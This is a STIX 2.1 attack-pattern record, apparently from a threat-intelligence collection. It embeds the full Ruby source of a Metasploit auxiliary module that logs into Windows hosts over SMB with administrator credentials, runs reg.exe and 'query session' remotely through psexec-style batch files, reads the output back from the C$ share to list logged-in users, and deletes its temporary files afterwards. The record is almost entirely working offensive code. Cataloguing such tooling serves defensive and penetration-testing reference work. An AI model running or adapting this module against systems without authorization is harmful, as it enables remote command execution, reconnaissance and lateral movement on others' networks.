{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--80fff932-c567-4d35-9002-c6d9f6a49eab",
    "created": "2024-08-14T16:31:15.190877Z",
    "modified": "2024-08-14T16:31:15.190881Z",
    "name": "Microsoft Windows Authenticated Logged In Users Enumeration",
    "description": "Q This module uses a valid administrator username and password to enumerate users currently logged in, using a similar technique than the \"psexec\" utility provided by SysInternals. It uses reg.exe to query the HKU base registry key. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/smb/psexec_loggedin_users.rb",
            "external_id": "psexec_loggedin_users.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.pentestgeek.com/2012/11/05/finding-logged-in-users-metasploit-module/"
        },
        {
            "source_name": "reference",
            "url": "https://docs.microsoft.com/en-us/sysinternals/downloads/psexec"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  # Exploit mixins should be called first\n  include Msf::Exploit::Remote::SMB::Client::Psexec\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  # Aliases for common classes\n  SIMPLE = Rex::Proto::SMB::SimpleClient\n  XCEPT  = Rex::Proto::SMB::Exceptions\n  CONST  = Rex::Proto::SMB::Constants\n\n  def initialize\n    super(\n      'Name'        => 'Microsoft Windows Authenticated Logged In Users Enumeration',\n      'Description' => %Q{\n          This module uses a valid administrator username and password to enumerate users\n        currently logged in, using a similar technique than the \"psexec\" utility provided\n        by SysInternals. It uses reg.exe to query the HKU base registry key.\n      },\n      'Author'      =>\n        [\n          'Royce Davis @R3dy__ <rdavis[at]accuvant.com>' # Metasploit module\n        ],\n      'References'  => [\n        [ 'CVE', '1999-0504'], # Administrator with no password (since this is the default)\n        [ 'OSVDB', '3106'],\n        [ 'URL', 'http://www.pentestgeek.com/2012/11/05/finding-logged-in-users-metasploit-module/' ],\n        [ 'URL', 'https://docs.microsoft.com/en-us/sysinternals/downloads/psexec' ]\n      ],\n      'License'     => MSF_LICENSE\n    )\n\n    register_options([\n      OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),\n      OptString.new('USERNAME', [false, 'The name of a specific user to search for', '']),\n      OptPort.new('RPORT', [true, 'The Target port', 445]),\n      OptString.new('WINPATH', [true, 'The name of the Windows directory', 'WINDOWS']),\n    ])\n  end\n\n  # This is the main controller function\n  def run_host(ip)\n    cmd = \"%SYSTEMDRIVE%\\\\#{datastore['WINPATH']}\\\\SYSTEM32\\\\cmd.exe\"\n    bat = \"%SYSTEMDRIVE%\\\\#{datastore['WINPATH']}\\\\Temp\\\\#{Rex::Text.rand_text_alpha(16)}.bat\"\n    text = \"\\\\#{datastore['WINPATH']}\\\\Temp\\\\#{Rex::Text.rand_text_alpha(16)}.txt\"\n    smbshare = datastore['SMBSHARE']\n\n    # Try and authenticate with given credentials\n    begin\n      connect\n      smb_login\n    rescue StandardError => autherror\n      print_error(\"#{autherror}\")\n      return\n    end\n\n    keys = get_hku(ip, smbshare, cmd, text, bat)\n    if !keys\n      cleanup_after(cmd, text, bat)\n      disconnect\n      return\n    end\n    keys.each do |key|\n      check_hku_entry(key, ip, smbshare, cmd, text, bat)\n    end\n    cleanup_after(cmd, text, bat)\n    disconnect\n  end\n\n  # This method runs reg.exe query HKU to get a list of each key within the HKU master key\n  # Returns an array object\n  def get_hku(ip, smbshare, cmd, text, bat)\n    begin\n      # Try and query HKU\n      command = \"#{cmd} /C echo reg.exe QUERY HKU ^> %SYSTEMDRIVE%#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}\"\n      out = psexec(command)\n      output = get_output(ip, smbshare, text)\n      cleanout = Array.new\n      output.each_line { |line| cleanout << line.chomp if line.include?(\"HKEY\") && line.split(\"-\").size == 8 && !line.split(\"-\")[7].include?(\"_\")}\n      return cleanout\n    rescue StandardError => hku_error\n      print_error(\"Error runing query against HKU. #{hku_error.class}. #{hku_error}\")\n      return nil\n    end\n  end\n\n  # This method will retrive output from a specified textfile on the remote host\n  def get_output(ip, smbshare, file)\n    begin\n      simple.connect(\"\\\\\\\\#{ip}\\\\#{smbshare}\")\n      outfile = simple.open(file, 'ro')\n      output = outfile.read\n      outfile.close\n      simple.disconnect(\"\\\\\\\\#{ip}\\\\#{smbshare}\")\n      return output\n    rescue StandardError => output_error\n      print_error(\"Error getting command output. #{output_error.class}. #{output_error}.\")\n      return false\n    end\n  end\n\n  def report_user(username)\n    report_note(\n      :host => rhost,\n      :proto => 'tcp',\n      :sname => 'smb',\n      :port => rport,\n      :type => 'smb.domain.loggedusers',\n      :data => \"#{username} is logged in\",\n      :update => :unique_data\n    )\n  end\n\n  # This method checks a provided HKU entry to determine if it is a valid SID\n  # Either returns nil or returns the name of a valid user\n  def check_hku_entry(key, ip, smbshare, cmd, text, bat)\n    begin\n      key = key.split(\"HKEY_USERS\\\\\")[1].chomp\n      command = \"#{cmd} /C echo reg.exe QUERY \\\"HKU\\\\#{key}\\\\Volatile Environment\\\" ^> %SYSTEMDRIVE%#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}\"\n      out = psexec(command)\n      if output = get_output(ip, smbshare, text)\n        domain, username, dnsdomain, homepath, logonserver = \"\",\"\",\"\",\"\",\"\"\n        # Run this IF loop and only check for specified user if datastore['USERNAME'] is specified\n        if datastore['USERNAME'].length > 0\n          output.each_line do |line|\n            username = line if line.include?(\"USERNAME\")\n            domain = line if line.include?(\"USERDOMAIN\")\n          end\n          if domain.split(\" \")[2].to_s.chomp + \"\\\\\" + username.split(\" \")[2].to_s.chomp == datastore['USERNAME']\n            print_good(\"#{datastore['USERNAME']} is logged in\")\n            report_user(datastore['USERNAME'])\n          end\n          return\n        end\n        output.each_line do |line|\n          domain = line if line.include?(\"USERDOMAIN\")\n          username = line if line.include?(\"USERNAME\")\n          dnsdomain = line if line.include?(\"USERDNSDOMAIN\")\n          homepath = line if line.include?(\"HOMEPATH\")\n          logonserver = line if line.include?(\"LOGONSERVER\")\n        end\n        if username.length > 0 && domain.length > 0\n          user = domain.split(\" \")[2].to_s + \"\\\\\" + username.split(\" \")[2].to_s\n          print_good(\"#{user}\")\n          report_user(user.chomp)\n        elsif logonserver.length > 0 && homepath.length > 0\n          uname = homepath.split('\\\\')[homepath.split('\\\\').size - 1]\n          if uname.include?(\".\")\n            uname = uname.split(\".\")[0]\n          end\n          user = logonserver.split('\\\\\\\\')[1].chomp.to_s + \"\\\\\" + uname.to_s\n          print_good(\"#{user}\")\n          report_user(user.chomp)\n        else\n          username = query_session(smbshare, ip, cmd, text, bat)\n          if username\n            hostname = (dnsdomain.split(\" \")[2] || \"\").split(\".\")[0] || \".\"\n            user = \"#{hostname}\\\\#{username}\"\n            print_good(\"#{user}\")\n            report_user(user.chomp)\n          else\n            print_status(\"Unable to determine user information for user: #{key}\")\n          end\n        end\n      else\n        print_status(\"Could not determine logged in users\")\n      end\n    rescue Rex::Proto::SMB::Exceptions::Error => check_error\n      print_error(\"Error checking reg key. #{check_error.class}. #{check_error}\")\n      return check_error\n    end\n  end\n\n  # Cleanup module.  Gets rid of .txt and .bat files created in the #{datastore['WINPATH']}\\Temp directory\n  def cleanup_after(cmd, text, bat)\n    begin\n      # Try and do cleanup command\n      cleanup = \"#{cmd} /C del %SYSTEMDRIVE%#{text} & del #{bat}\"\n      print_status(\"Executing cleanup\")\n      out = psexec(cleanup)\n    rescue StandardError => cleanuperror\n      print_error(\"Unable to processes cleanup commands: #{cleanuperror}\")\n      print_warning(\"Maybe %SYSTEMDRIVE%#{text} must be deleted manually\")\n      print_warning(\"Maybe #{bat} must be deleted manually\")\n      return cleanuperror\n    end\n  end\n\n  # Method trys to use \"query session\" to determine logged in user\n  def query_session(smbshare, ip, cmd, text, bat)\n    begin\n      command = \"#{cmd} /C echo query session ^> %SYSTEMDRIVE%#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}\"\n      out = psexec(command)\n      userline = \"\"\n      if output = get_output(ip, smbshare, text)\n        output.each_line { |line| userline << line if line[0] == '>' }\n      else\n        return nil\n      end\n      return userline.split(\" \")[1].chomp\n    rescue\n      return nil\n    end\n  end\nend\n"
}